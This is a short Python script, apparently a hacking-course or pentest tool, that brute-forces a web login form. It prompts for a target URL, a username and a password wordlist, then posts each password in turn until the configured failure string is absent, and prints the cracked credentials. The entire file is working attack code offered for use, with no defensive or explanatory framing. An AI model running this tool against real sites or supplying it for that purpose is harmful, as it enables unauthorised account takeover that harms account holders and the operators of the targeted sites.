import requests
from termcolor import  colored


url=input('[+] Enter Page URL:')
username=input('[+] Enter Username For the account to bruteforce:')
password_file=input('[+] Enter Password file to use: ')
login_failed_string= input('[+] Enter String That occurs when login fails: ' )

def cracking(username,url):
    for password in passwords:
        password = password.strip()
        print(colored(('Trying.. '+password),'red'))
        data={'username':username,'password':password,'Login':'submit'}
        response= requests.post(url,data=data)
        if login_failed_string in response.content.decode():
            pass
        else:
            print(colored(('[+] Found Username: ==>'+username),'green'))
            print(colored(('[+] Found Password: ==>'+password),'green'))
            exit()
with open(password_file,'r') as passwords:
    cracking(username,url)

print('[!!] password Not in List')

